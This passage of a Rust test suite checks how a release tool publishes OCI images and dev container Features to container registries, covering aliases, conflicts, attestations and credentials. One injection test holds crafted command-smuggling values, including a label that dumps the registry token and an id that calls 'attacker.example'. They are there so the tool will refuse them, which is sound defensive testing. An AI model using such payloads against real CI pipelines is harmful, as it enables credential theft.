            assert!(outcome.status.success(), "{}", outcome.stderr);
            let tags = outcome.tags(DOCKERHUB_REPOSITORY);
            assert_eq!(
                tags.get("1.2").map(String::as_str),
                Some(outcome.index_digest.as_str()),
                "the backport's own minor alias advances"
            );
            for held in ["1", "latest"] {
                assert_eq!(
                    tags.get(held).map(String::as_str),
                    Some(FOREIGN_DIGEST),
                    "{held} still resolves the newer release the destination already carried"
                );
            }
        }

        /// A prerelease publishes its exact version and advances nothing stable.
        // intentional-feature-scenario: do-not-advance-stable-alias-for-prerelease/buildx
        // intentional-feature-test: advances_no_stable_alias_for_a_prerelease
        #[test]
        fn advances_no_stable_alias_for_a_prerelease() {
            let recipe = Recipe::new("oci-alias-prerelease", DOCKERHUB_JOB);
            let outcome = recipe.run("2.0.0-rc.1");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>(),
                vec!["2.0.0-rc.1".to_owned()]
            );
            assert!(outcome.observation().destination_aliases.is_empty());
        }

        /// Major zero has no broad alias to advance.
        #[test]
        fn omits_the_broad_alias_while_the_major_version_is_zero() {
            let recipe = Recipe::new("oci-alias-major-zero", DOCKERHUB_JOB);
            let outcome = recipe.run("0.4.0");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>(),
                vec!["0.4".to_owned(), "0.4.0".to_owned(), "latest".to_owned()]
            );
        }

        /// A destination already holding this version's subject is recovered.
        #[test]
        fn recovers_a_rerun_that_already_published_the_same_subject() {
            let recipe = Recipe::new("oci-rerun", DOCKERHUB_JOB);
            let first = recipe.run("1.2.3");
            assert!(first.status.success(), "{}", first.stderr);
            let second = recipe.run("1.2.3");
            assert!(
                second.status.success(),
                "a rerun recovers: {}",
                second.stderr
            );
            assert_eq!(
                second.observation().state,
                ObservationState::Present,
                "the already published subject is accepted rather than resubmitted"
            );
            assert_eq!(
                first.tags(DOCKERHUB_REPOSITORY),
                second.tags(DOCKERHUB_REPOSITORY)
            );
        }

        /// A destination holding a different subject under this version conflicts.
        #[test]
        fn reports_a_destination_holding_a_different_subject_as_a_conflict() {
            let recipe = Recipe::new("oci-conflict", DOCKERHUB_JOB)
                .seeded(DOCKERHUB_REPOSITORY, &[("1.2.3", FOREIGN_DIGEST)]);
            let outcome = recipe.run("1.2.3");
            assert!(
                outcome.status.success(),
                "the conflict is reported through the observation: {}",
                outcome.stderr
            );
            assert_eq!(outcome.observation().state, ObservationState::Conflict);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .get("1.2.3")
                    .map(String::as_str),
                Some(FOREIGN_DIGEST),
                "a conflicting destination is never overwritten"
            );
        }

        /// The published index has to annotate the version the release sealed.
        #[test]
        fn refuses_a_subject_annotating_a_version_the_release_did_not_seal() {
            let recipe = Recipe::new("oci-annotation", DOCKERHUB_JOB);
            let outcome = recipe.run_with_annotation("1.2.3", "1.2.2");
            assert!(
                !outcome.status.success(),
                "a subject annotated with another version fails the publication"
            );
        }

        /// Each selected component is attached, read back, and recorded.
        #[test]
        fn records_every_selected_component_and_nothing_else() {
            let recipe = Recipe::new("oci-components", DOCKERHUB_JOB);
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let attached = outcome
                .observation()
                .attached_metadata
                .iter()
                .fold(BTreeMap::<String, BTreeSet<String>>::new(), |mut by_kind, component| {
                    by_kind
                        .entry(component.kind.to_string())
                        .or_default()
                        .insert(component.digest.clone());
                    by_kind
                });
            assert_eq!(
                attached.keys().map(String::as_str).collect::<BTreeSet<_>>(),
                BTreeSet::from(["provenance", "sbom", "signature"]),
                "the recipe records exactly the selected component kinds"
            );
            assert_eq!(
                attached.get("sbom"),
                Some(&BTreeSet::from([
                    SBOM_DIGEST.to_owned(),
                    ARM64_SBOM_DIGEST.to_owned()
                ])),
                "each platform SBOM is bound to its attestation manifest"
            );
            assert_eq!(
                attached.get("provenance"),
                Some(&BTreeSet::from([
                    PROVENANCE_DIGEST.to_owned(),
                    ARM64_PROVENANCE_DIGEST.to_owned()
                ])),
                "each platform provenance predicate is recorded"
            );
            assert!(attached.contains_key("signature"), "{attached:?}");
            let attestation_references = BTreeSet::from([
                format!("{DOCKERHUB_REPOSITORY}@{}", manifest_digest(AMD64_ATTESTATION_MANIFEST)),
                format!("{DOCKERHUB_REPOSITORY}@{}", manifest_digest(ARM64_ATTESTATION_MANIFEST)),
            ]);
            for kind in ["sbom", "provenance"] {
                assert_eq!(
                    outcome.observation().attached_metadata.iter()
                        .filter(|component| component.kind.to_string() == kind)
                        .filter_map(|component| component.reference.clone())
                        .collect::<BTreeSet<_>>(),
                    attestation_references,
                    "{kind} references name the attestation manifest that contains it"
                );
            }
            let signature_reference = format!("{DOCKERHUB_REPOSITORY}@{}", outcome.index_digest);
            assert_eq!(
                outcome.observation().attached_metadata.iter()
                    .find(|component| component.kind.to_string() == "signature")
                    .and_then(|component| component.reference.as_deref()),
                Some(signature_reference.as_str()),
                "signature references the published subject digest"
            );
            let signed =
                std::fs::read_to_string(outcome.registry.join("signed.log")).expect("signing log");
            assert!(
                signed.contains(&format!("@{}", outcome.index_digest)),
                "the signature is bound to the published digest rather than to a tag: {signed}"
            );
        }

        /// An omitted component is not attached and leaves no record of itself.
        #[test]
        fn omits_only_the_named_component_without_recording_the_omission() {
            let workspace = two_destination_workspace("oci-omit");
            let configuration =
                std::fs::read_to_string(workspace.root().join(".intentional/config.yml"))
                    .expect("configuration")
                    .replace("ghcr: {}", "ghcr: { omit: [ signature ] }");
            workspace.write(".intentional/config.yml", &configuration);
            converge(workspace.root(), WorkflowRole::Publish);
            let document: Value =
                serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                    .expect("workflow parses");
            let jobs = document["jobs"].as_mapping().expect("jobs");
            let (_, verification_steps, _) = publication_verification(jobs, GHCR_JOB);
            let components = verification_steps
                .iter()
                .filter_map(|step| step["with"]["components"].as_str())
                .collect::<Vec<_>>();
            assert_eq!(
                components,
                vec!["sbom provenance"],
                "the omitted component is not among the ones the recipe attaches"
            );
            let omitting = serde_yaml::to_string(&document["jobs"][GHCR_JOB]).expect("job renders");
            assert!(
                !omitting.contains("cosign"),
                "a target that omits its signature installs no signing client: {omitting}"
            );
            assert!(
                document["jobs"][GHCR_JOB]["permissions"]["id-token"].is_null(),
                "a target that presents no signature receives no workflow identity: {omitting}"
            );
            assert!(
                !omitting.contains("omit") && !omitting.contains("waiv"),
                "nothing in the omitting target's job records that a component was omitted"
            );
            let peer =
                serde_yaml::to_string(&document["jobs"][DOCKERHUB_JOB]).expect("job renders");
            assert!(
                peer.contains("cosign"),
                "the omission applies to its own target and to no peer"
            );
            assert_eq!(
                document["jobs"][DOCKERHUB_JOB]["permissions"]["id-token"].as_str(),
                Some("write"),
                "the signing peer retains the identity its recipe presents"
            );
        }

        /// Credentials are named, never valued, and each target names its own.
        #[test]
        fn names_the_credentials_each_destination_authenticates_with() {
            let conventional = Recipe::new("oci-credentials", DOCKERHUB_JOB);
            let step = publish_step(
                conventional.workspace.root(),
                DOCKERHUB_JOB,
                Path::new("/runner-temp"),
                "1.2.3",
                SUBJECT_DIGEST,
            );
            assert_eq!(
                step.publisher_env
                    .get("INTENTIONAL_REGISTRY_USER")
                    .map(String::as_str),
                Some("example-account"),
                "Docker Hub reads its account from the conventional variable"
            );
            assert_eq!(
                step.publisher_env
                    .get("INTENTIONAL_REGISTRY_TOKEN")
                    .map(String::as_str),
                Some("example-token")
            );

            let ghcr = Recipe::new("oci-credentials-ghcr", GHCR_JOB);
            let step = publish_step(
                ghcr.workspace.root(),
                GHCR_JOB,
                Path::new("/runner-temp"),
                "1.2.3",
                SUBJECT_DIGEST,
            );
            assert_eq!(
                step.publisher_env
                    .get("INTENTIONAL_REGISTRY_TOKEN")
                    .map(String::as_str),
                Some("example-github-token"),
                "GHCR authenticates with the scoped workflow token"
            );
            let jobs = publish_jobs(ghcr.workspace.root());
            let permissions = &jobs[&Value::String(GHCR_JOB.to_owned())]["permissions"];
            assert_eq!(permissions["packages"].as_str(), Some("write"));
            assert_eq!(permissions["contents"].as_str(), Some("read"));

            let overridden = two_destination_workspace("oci-credential-overrides");
            let configuration =
                std::fs::read_to_string(overridden.root().join(".intentional/config.yml"))
                    .expect("configuration")
                    .replace(
                        "dockerhub: { repository: example-owner/example-image }",
                        "dockerhub:\n            repository: example-owner/example-image\n            username-var: EXAMPLE_ACCOUNT_VAR\n            token-secret: EXAMPLE_TOKEN_SECRET",
                    );
            overridden.write(".intentional/config.yml", &configuration);
            converge(overridden.root(), WorkflowRole::Publish);
            let derived = serde_yaml::to_string(
                &publish_jobs(overridden.root())[&Value::String(DOCKERHUB_JOB.to_owned())],
            )
            .expect("job renders");
            assert!(
                derived.contains("vars.EXAMPLE_ACCOUNT_VAR")
                    && derived.contains("secrets.EXAMPLE_TOKEN_SECRET"),
                "an overridden credential name is what the job reads: {derived}"
            );
            assert!(
                !derived.contains("DOCKERHUB_USERNAME") && !derived.contains("DOCKERHUB_TOKEN"),
                "the conventional names are replaced rather than added to"
            );
        }

        /// A destination's own digest has to address its own bytes.
        #[test]
        fn refuses_a_destination_whose_digest_is_not_the_bytes_it_serves() {
            let recipe = Recipe::new("oci-push-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "push");
            assert!(
                !outcome.status.success(),
                "a destination naming one subject and serving another fails the publication"
            );
        }

        /// The destination has to hold the content the release sealed.
        ///
        /// A registry re-serializes the index it is given, so the recipe cannot
        /// compare the index digest. What it compares is the set of manifests
        /// the published index references, which a registry carries through
        /// unchanged -- and which is what "the same subject" means across two
        /// destinations that were each handed the same layout.
        #[test]
        fn refuses_a_destination_indexing_manifests_the_release_did_not_seal() {
            let recipe = Recipe::new("oci-content-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "content");
            assert_eq!(
                outcome.observation().state,
                ObservationState::Conflict,
                "an index referencing other manifests is recorded as a conflict"
            );
            assert!(outcome.waits.is_empty(), "a conflict is never retried");
        }

        /// The destination has to publish the name the release sealed.
        #[test]
        fn refuses_a_subject_published_under_another_name() {
            let recipe = Recipe::new("oci-title-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "title");
            assert!(
                !outcome.status.success(),
                "a subject annotated with another name fails the publication"
            );
        }

        /// An alias only moves when the released version is the newest in its line.
        #[test]
        fn never_advances_a_minor_alias_a_newer_patch_already_holds() {
            let recipe = Recipe::new("oci-alias-superseded", DOCKERHUB_JOB).seeded(
                DOCKERHUB_REPOSITORY,
                &[("1.2.4", FOREIGN_DIGEST), ("1.2", FOREIGN_DIGEST)],
            );
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .get("1.2")
                    .map(String::as_str),
                Some(FOREIGN_DIGEST),
                "a superseded patch does not take its own minor alias"
            );
            assert!(
                outcome.observation().destination_aliases.is_empty(),
                "an alias that did not move is not recorded as one that did"
            );
        }

        /// An alias that resolves something else was not a promotion.
        #[test]
        fn refuses_an_alias_that_did_not_move_to_the_published_subject() {
            let recipe = Recipe::new("oci-alias-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "alias");
            assert!(
                !outcome.status.success(),
                "an alias resolving another subject fails the publication"
            );
        }

        /// A public client that retrieved other bytes proves nothing.
        #[test]
        fn refuses_a_public_retrieval_that_resolved_another_subject() {
            let recipe = Recipe::new("oci-public-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "public");
            assert_eq!(
                outcome.observation().state,
                ObservationState::Conflict,
                "a consumer path resolving another subject is refused by verification"
            );
        }

        /// A selected component the destination does not hold is a failure.
        #[test]
        fn refuses_a_selected_component_the_destination_does_not_hold() {
            let recipe = Recipe::new("oci-missing-component", DOCKERHUB_JOB);
            let outcome = recipe.run_unattested("1.2.3");
            assert!(
                !outcome.status.success(),
                "a component this target still selects cannot quietly leave the evidence"
            );
        }

        #[test]
        fn refuses_an_index_whose_second_platform_attestation_is_incomplete() {
            let recipe = Recipe::new("oci-incomplete-arm64-attestation", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "arm64-attestation");
            assert!(
                !outcome.status.success(),
                "valid amd64 metadata cannot stand in for malformed arm64 metadata"
            );
        }

        #[test]
        fn refuses_a_transient_tag_listing_failure_before_promotion() {
            let recipe = Recipe::new("oci-listing-transient", DOCKERHUB_JOB)
                .seeded(DOCKERHUB_REPOSITORY, &[("1.2.3", FOREIGN_DIGEST)]);
            let outcome = recipe.run_with_drift("1.2.3", "listing");
            assert!(!outcome.status.success());
            assert!(outcome.stderr.contains("UNAVAILABLE"), "{}", outcome.stderr);
            assert_eq!(
                outcome.tags(DOCKERHUB_REPOSITORY).get("1.2.3").map(String::as_str),
                Some(FOREIGN_DIGEST),
                "recovery after listing cannot overwrite the exact version"
            );
        }

        #[test]
        fn treats_name_unknown_as_an_absent_repository_before_first_publication() {
            let recipe = Recipe::new("oci-name-unknown", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "missing-repository");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .get("1.2.3")
                    .map(String::as_str),
                Some(outcome.index_digest.as_str())
            );
        }

        /// A seal that recorded no version or no digest publishes nothing.
        ///
        /// `set -u` catches a variable the derivation never routed. These catch
        /// the state one step further in: a routed variable that arrived empty,
        /// which is what a build job that produced no output leaves behind.
        /// Both are separately falsifiable, so both are run.
        #[test]
        fn refuses_a_seal_that_carries_no_version_or_no_digest() {
            for (label, version, digest) in [
                ("oci-empty-version", "", SUBJECT_DIGEST),
                ("oci-empty-digest", "1.2.3", ""),
            ] {
                let recipe = Recipe::new(label, DOCKERHUB_JOB);
                let outcome = recipe.run_with_seal(version, digest);
                assert!(
                    !outcome.status.success(),
                    "a seal carrying version {version:?} and digest {digest:?} publishes nothing"
                );
            }
        }

        /// A subject the derivation cannot name never reaches a destination.
        #[test]
        fn refuses_to_derive_a_publication_whose_subject_it_cannot_name() {
            let unnamed = two_destination_workspace("oci-unnamed-image");
            unnamed.write("component/Dockerfile", "FROM scratch\n");
            let comparison =
                compare_workflow(unnamed.root(), WorkflowRole::Publish, None).expect("runs");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            assert!(
                comparison.diagnostics.iter().any(|diagnostic| {
                    diagnostic.code == "subject-identity-invalid"
                        && diagnostic.message.contains(OCI_TITLE_LABEL)
                }),
                "{:?}",
                comparison.diagnostics
            );

            let feature = feature_workspace("oci-unnamed-feature");
            feature.write(
                "component/devcontainer-feature.json",
                r#"{"version":"1.2.3"}"#,
            );
            let comparison =
                compare_workflow(feature.root(), WorkflowRole::Publish, None).expect("runs");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            assert!(
                comparison
                    .diagnostics
                    .iter()
                    .any(|diagnostic| diagnostic.code == "subject-identity-invalid"),
                "{:?}",
                comparison.diagnostics
            );
        }

        /// A source-declared name never becomes executable text.
        ///
        /// The reproduction is the reviewer's: a crafted label that closed the
        /// quoting of the observation's `printf` and exfiltrated the registry
        /// token while the recipe still exited 0. It is kept as a refusal at
        /// derivation, and as a positive proof that the value the body reads
        /// comes from the environment rather than from the source text.
        #[test]
        fn never_lets_a_source_declared_name_reach_a_credentialed_shell() {
            for crafted in [
                "alt'; env | grep TOKEN > /loot; #",
                "a`id`b",
                "Example Image",
                "UPPER",
                "trailing-",
            ] {
                let workspace = two_destination_workspace("oci-injection");
                workspace.write(
                    "component/Dockerfile",
                    &format!("FROM scratch\nLABEL org.opencontainers.image.title=\"{crafted}\"\n"),
                );
                let comparison =
                    compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("runs");
                assert_eq!(
                    comparison.status,
                    ComparisonStatus::Blocked,
                    "{crafted:?} is not an OCI repository name"
                );
                assert!(
                    comparison
                        .diagnostics
                        .iter()
                        .any(|diagnostic| diagnostic.code == "subject-identity-invalid"),
                    "{:?}",
                    comparison.diagnostics
                );
            }

            let feature = feature_workspace("oci-injection-feature");
            feature.write(
                "component/devcontainer-feature.json",
                r#"{"id":"f'; curl https://attacker.example; #","version":"1.2.3"}"#,
            );
            assert_eq!(
                compare_workflow(feature.root(), WorkflowRole::Publish, None)
                    .expect("runs")
                    .status,
                ComparisonStatus::Blocked,
                "a Feature id is source too, and is held to the same grammar"
            );

            // The grammar is the boundary, and the body still reads the value
            // from the environment rather than from its own source text, so a
            // name that passes the grammar is not spliced either.
            let accepted = Recipe::new("oci-identity-routed", DOCKERHUB_JOB);
            let step = publish_step(
                accepted.workspace.root(),
                DOCKERHUB_JOB,
                Path::new("/runner-temp"),
                "1.2.3",
                SUBJECT_DIGEST,
            );
            assert_eq!(
                step.publisher_env
                    .get("INTENTIONAL_SUBJECT_IDENTITY")
                    .map(String::as_str),
                Some("example-image"),
                "the identity reaches the body through env like every other value"
            );
            assert!(
                !step.publisher_run.contains("example-image"),
                "and never as text in the body itself: {}",
                step.publisher_run
            );
            let jobs = publish_jobs(accepted.workspace.root());
            let build_step = jobs[&Value::String("intentional_build_component_buildx".to_owned())]
                ["steps"]
                .as_sequence()
                .expect("steps")
                .iter()
                .find(|step| {
                    step["name"]
                        .as_str()
                        .is_some_and(|name| name.starts_with("Build the"))
                })
                .expect("the build job builds the subject");
            let build = serde_yaml::to_string(build_step).expect("build step renders");
            assert!(
                build.contains("INTENTIONAL_SUBJECT_IDENTITY: example-image")
                    && build.contains("${INTENTIONAL_SUBJECT_IDENTITY}"),
                "the annotation reads the routed value rather than splicing it: {build}"
            );
        }

        /// A multi-stage build is named after the stage it ships.
        #[test]
        fn names_the_image_after_the_stage_the_release_ships() {
            let workspace = two_destination_workspace("oci-multi-stage");
            workspace.write(
                "component/Dockerfile",
                "FROM scratch AS builder\nLABEL org.opencontainers.image.title=\"builder-image\"\nFROM scratch\nLABEL org.opencontainers.image.title=\"example-image\"\n",
            );
            converge(workspace.root(), WorkflowRole::Publish);
            let step = publish_step(
                workspace.root(),
                DOCKERHUB_JOB,
                Path::new("/runner-temp"),
                "1.2.3",
                SUBJECT_DIGEST,
            );
            assert_eq!(
                step.publisher_env
                    .get("INTENTIONAL_SUBJECT_IDENTITY")
                    .map(String::as_str),
                Some("example-image"),
                "the final stage's label is the one the image carries"
            );
        }

        /// A label the build resolves is not a name the source declares.
        #[test]
        fn reads_only_a_literal_image_name_from_the_dockerfile() {
            let workspace = two_destination_workspace("oci-argument-image");
            workspace.write(
                "component/Dockerfile",
                "FROM scratch\nARG NAME\nLABEL org.opencontainers.image.title=$NAME\n",
            );
            assert_eq!(
                compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                    .expect("runs")
                    .status,
                ComparisonStatus::Blocked,
                "a name resolved at build time is not the name the release seals"
            );

            workspace.write(
                "component/Dockerfile",
                "FROM scratch\nLABEL maintainer=\"example\" \\\n      org.opencontainers.image.title=\"example-image\"\n",
            );
            assert_eq!(
                compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                    .expect("runs")
                    .status,
                ComparisonStatus::Different,
                "a continued LABEL statement still declares the name"
            );
        }

        /// A Feature is promoted through its native client and its native aliases.
        #[test]
        fn publishes_a_dev_container_feature_through_its_native_client() {
            let recipe = Recipe::feature("oci-feature");
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let observation = outcome.observation();
            let subject = observation.subject.as_ref().expect("a subject");
            assert_eq!(
                subject.identity, FEATURE_ID,
                "the Feature names itself, so the derivation reads that name"
            );
            assert_eq!(subject.kind, "dev-container-feature");
            let aliases = observation
                .destination_aliases
                .iter()
                .map(|alias| alias.name.clone())
                .collect::<BTreeSet<_>>();
            assert_eq!(
                aliases,
                BTreeSet::from(["latest".to_owned(), "1.2".to_owned(), "1".to_owned()]),
                "the aliases its own client maintains are read back and recorded"
            );
        }

        /// A stable Feature must expose every alias its native client contract owns.
        #[test]
        fn refuses_a_stable_feature_missing_a_required_alias() {
            let recipe = Recipe::feature("oci-feature-stable-missing-alias");
            let outcome = recipe.run_with_drift("1.2.3", "stable-missing-alias");
            assert!(!outcome.status.success());
            assert_eq!(
                outcome.stderr,
                "Required stable Feature alias 1 is missing after publication\n"
            );
        }

        /// A registry failure is not misreported as an alias the client omitted.
        #[test]
        fn reports_a_stable_feature_alias_read_failure_separately() {
            let recipe = Recipe::feature("oci-feature-alias-read-error");
            let outcome = recipe.run_with_drift("1.2.3", "alias-read-error");
            assert!(!outcome.status.success());
            assert_eq!(
                outcome.stderr,
                "Could not read Feature alias latest after publication: UNAVAILABLE: transient registry failure\n"
            );
        }

        /// A stable alias pointing elsewhere is distinct from an absent alias.
        #[test]
        fn refuses_a_stable_feature_alias_resolving_another_subject() {
            let recipe = Recipe::feature("oci-feature-stable-wrong-alias");
            let outcome = recipe.run_with_drift("1.2.3", "stable-wrong-alias");
            assert!(!outcome.status.success());
            let published = &outcome.tags(FEATURE_REPOSITORY)["1.2.3"];
            assert_eq!(
                outcome.stderr,
                format!(
                    "Required stable Feature alias 1 resolves {FOREIGN_DIGEST} instead of {}\n",
                    published
                )
            );
        }

        /// A Feature the client would overwrite is a conflict, not a publication.
        #[test]
        fn reports_a_feature_destination_holding_another_subject_as_a_conflict() {
            let recipe = Recipe::feature("oci-feature-conflict")
                .seeded(FEATURE_REPOSITORY, &[("1.2.3", FOREIGN_DIGEST)]);
            let outcome = recipe.run("1.2.3");
            assert!(
                outcome.status.success(),
                "the conflict is reported through the observation: {}",
                outcome.stderr
            );
            assert_eq!(outcome.observation().state, ObservationState::Conflict);
            assert_eq!(
                outcome
                    .tags(FEATURE_REPOSITORY)
                    .get("1.2.3")
                    .map(String::as_str),
                Some(FOREIGN_DIGEST),
                "a native client is never handed a destination it would overwrite"
            );
        }

        /// A prerelease that moved stable aliases records every move.
        // intentional-feature-scenario: do-not-advance-stable-alias-for-prerelease/feature
        // intentional-feature-test: records_stable_aliases_a_prerelease_client_moved
        #[test]
        fn records_stable_aliases_a_prerelease_client_moved() {
            let recipe = Recipe::feature("oci-feature-prerelease");
            let outcome = recipe.run_with_drift("2.0.0-rc.1", "prerelease-aliases");
            assert!(
                outcome.status.success(),
                "the recipe verifies rather than overrides the native alias policy: {}",
                outcome.stderr
            );
            assert_eq!(
                outcome
                    .observation()
                    .destination_aliases
                    .iter()
                    .map(|alias| alias.name.as_str())
                    .collect::<BTreeSet<_>>(),
                BTreeSet::from(["latest", "2"]),
                "unexpected stable alias moves remain visible in release evidence"
            );
        }

        /// A destination no public client can reach reports itself.
        #[test]
        fn reports_a_destination_no_public_client_can_retrieve() {
            let recipe = Recipe::new("oci-private", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "private");
            assert!(
                outcome.status.success(),
                "the destination is reported through the observation: {}",
                outcome.stderr
            );
            assert_eq!(
                outcome.observation().state,
                ObservationState::Pending,
                "the publication was accepted; what has not happened is it becoming observable"
            );
            assert_eq!(
                outcome.waits,
                [vec![3, 6, 12], vec![15; 18], vec![9]].concat(),
                "OCI readback spends the emitted retry policy before reporting pending"
            );
            assert_eq!(outcome.verified("interval"), "3");
            assert_eq!(outcome.verified("backoff"), "2");
            assert_eq!(outcome.verified("maximum-interval"), "15");
            assert_eq!(outcome.verified("deadline"), "300");
            assert!(
                outcome.stderr.contains("public client"),
                "the step says why, on the run's most likely first outcome: {}",
                outcome.stderr
            );
        }

        #[test]
        fn retries_each_not_yet_visible_probe_within_the_oci_policy() {
            for (label, drift) in [
                ("oci-initially-invisible", "initially-invisible"),
                ("oci-reread-invisible", "reread-invisible"),
            ] {
                let recipe = Recipe::new(label, DOCKERHUB_JOB);
                let outcome = recipe.run_with_drift("1.2.3", drift);
                assert!(outcome.status.success(), "{}: {}", drift, outcome.stderr);
                assert_eq!(
                    outcome.observation().state,
                    ObservationState::Present,
                    "{drift} becomes visible within policy"
                );
                assert_eq!(
                    outcome.waits,
                    vec![3],
                    "{drift} consumes the first emitted interval"
                );
            }
        }

        #[test]
        fn shares_one_oci_policy_across_both_not_yet_visible_probes() {
            let recipe = Recipe::new("oci-shared-readback-policy", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "shared-budget");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            assert_eq!(
                outcome.observation().state,
                ObservationState::Pending,
                "the clean-client re-read exhausts only the policy remaining after initial retrieval"
            );
            assert_eq!(
                outcome.waits,
                [vec![3, 6, 12], vec![15; 18], vec![9]].concat(),
                "both probes together spend exactly the one declared 300-second deadline"
            );
        }

        /// A prerelease Feature publishes when its client leaves stable aliases alone.
        #[test]
        fn publishes_a_prerelease_feature_that_moved_no_stable_alias() {
            let recipe = Recipe::feature("oci-feature-prerelease-clean");
            let outcome = recipe.run("2.0.0-rc.1");
            assert!(
                outcome.status.success(),
                "a prerelease Feature is publishable: {}",
                outcome.stderr
            );
            assert!(outcome.observation().destination_aliases.is_empty());
            assert_eq!(
                outcome
                    .tags(FEATURE_REPOSITORY)
                    .keys()
                    .map(String::as_str)
                    .collect::<BTreeSet<_>>(),
                BTreeSet::from(["2.0.0-rc.1"]),
                "the independent client fixture applies semver prerelease rules"
            );
        }

        #[test]
        fn publishes_and_reads_back_a_major_zero_feature() {
            let recipe = Recipe::feature("oci-feature-major-zero");
            let outcome = recipe.run("0.1.6");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let tags = outcome.tags(FEATURE_REPOSITORY);
            let published = tags.get("0.1.6").expect("exact Feature version");
            for alias in ["latest", "0.1", "0"] {
                assert_eq!(
                    tags.get(alias),
                    Some(published),
                    "the Feature client owns and the recipe verifies {alias}"
                );
            }
            assert_eq!(
                outcome
                    .observation()
                    .destination_aliases
                    .iter()
                    .map(|alias| alias.name.as_str())
                    .collect::<BTreeSet<_>>(),
                BTreeSet::from(["latest", "0.1", "0"])
            );
        }

        /// A Feature cannot be told to publish somewhere its client will not.
        #[test]
        fn refuses_a_feature_repository_its_client_would_ignore() {
            let workspace = feature_workspace("oci-feature-override");
            let configuration =
                std::fs::read_to_string(workspace.root().join(".intentional/config.yml"))
                    .expect("configuration")
                    .replace("ghcr: {}", "ghcr: { repository: other-owner/other-name }");
            workspace.write(".intentional/config.yml", &configuration);
            let comparison =
                compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("runs");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            // The refusal is about a value an author typed, so it names the key
            // they typed it into rather than the unit that contains it. Round 2
            // required that placement; asserting only the code would leave the
            // whole of `StepsRefusal::path` -- the field, its constructor, and
            // the fallback that reads it -- changing nothing any test can see.
            let refusal = comparison
                .diagnostics
                .iter()
                .find(|diagnostic| diagnostic.code == "destination-not-overridable")
                .unwrap_or_else(|| panic!("{:?}", comparison.diagnostics));
            let unit = configured_release_unit(workspace.root());
            assert_eq!(
                refusal.path.as_deref(),
                Some(format!("release-units.{unit}.oci.ghcr.repository").as_str()),
                "the diagnostic points at the line to edit"
            );
        }

        /// A name no destination could resolve is refused before a runner meets it.
        #[test]
        fn refuses_a_subject_name_longer_than_a_registry_admits() {
            let workspace = two_destination_workspace("oci-long-name");
            workspace.write(
                "component/Dockerfile",
                &format!(
                    "FROM scratch\nLABEL org.opencontainers.image.title=\"{}\"\n",
                    "a".repeat(256)
                ),
            );
            assert_eq!(
                compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                    .expect("runs")
                    .status,
                ComparisonStatus::Blocked,
                "a name the distribution specification cannot carry fails at derivation"
            );
        }

        /// A repackage that produced other bytes is not a promotion.
        #[test]
        fn refuses_a_feature_whose_published_bytes_are_not_the_ones_the_build_sealed() {
            let recipe = Recipe::feature("oci-feature-repackaged");
            let outcome = recipe.run_with_drift("1.2.3", "repackage");
            assert_eq!(
                outcome.observation().state,
                ObservationState::Conflict,
                "a destination holding bytes the build job did not produce is recorded as a conflict"
            );
        }

        /// The consumer check has to be a consumer check.
        #[test]
        fn retrieves_the_release_with_no_credential_of_its_own() {
            let recipe = Recipe::new("oci-clean-client", DOCKERHUB_JOB);
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let retrieval = outcome
                .observation()
                .retrieval
                .as_ref()
                .expect("a retrieval");
            assert_eq!(retrieval.digest, outcome.index_digest);
            assert_eq!(retrieval.client, "crane");
            let stores = outcome.retrieval_stores();
            assert_eq!(
                stores.iter().filter(|store| *store == "inherited").count(),
                1,
                "only the inline publisher reads under its write credential: {stores:?}"
            );
            assert!(
                stores.len() > 1
                    && stores
                        .iter()
                        .skip(1)
                        .all(|store| store.contains("clean-client")),
                "every observer read uses the isolated credential store: {stores:?}"
            );
            let store = std::fs::read_dir(&stores[1])
                .expect("the clean credential store exists")
                .map(|entry| {
                    entry
                        .expect("entry")
                        .file_name()
                        .to_string_lossy()
                        .into_owned()
                })
                .collect::<BTreeSet<_>>();
            assert!(
                !store.contains("config.json"),
                "the retrieving client is given no credential of its own: {store:?}"
            );
            assert!(
                store.contains("subject.json"),
                "and it retrieved the subject's own bytes rather than only resolving its tag: {store:?}"
            );
        }
    }
